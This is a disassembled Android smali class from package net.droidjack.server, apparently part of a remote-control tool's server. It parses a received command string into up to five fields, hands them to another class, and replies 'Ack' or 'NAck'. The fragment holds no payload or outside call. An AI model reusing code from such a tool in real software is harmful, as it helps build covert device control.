.class Lnet/droidjack/server/s;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/q;

.field private final synthetic b:Ljava/lang/String;


# direct methods
.method constructor <init>(Lnet/droidjack/server/q;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/s;->a:Lnet/droidjack/server/q;

    iput-object p2, p0, Lnet/droidjack/server/s;->b:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()[B
    .locals 6

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/s;->b:Ljava/lang/String;

    const-string v1, ",."

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v1, v0, v1

    const/4 v2, 0x1

    aget-object v2, v0, v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const/4 v3, 0x2

    :try_start_1
    aget-object v3, v0, v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_0
    const/4 v4, 0x3

    :try_start_2
    aget-object v4, v0, v4
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :goto_1
    const/4 v5, 0x4

    :try_start_3
    aget-object v5, v0, v5
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :goto_2
    :try_start_4
    iget-object v0, p0, Lnet/droidjack/server/s;->a:Lnet/droidjack/server/q;

    invoke-static/range {v0 .. v5}, Lnet/droidjack/server/q;->a(Lnet/droidjack/server/q;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    :goto_3
    return-object v0

    :catch_0
    move-exception v3

    const-string v3, ""

    goto :goto_0

    :catch_1
    move-exception v4

    const-string v4, ""

    goto :goto_1

    :catch_2
    move-exception v0

    const-string v5, ""
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto :goto_2

    :catch_3
    move-exception v0

    move-object v1, v0

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/s;->a()[B

    move-result-object v0

    return-object v0
.end method
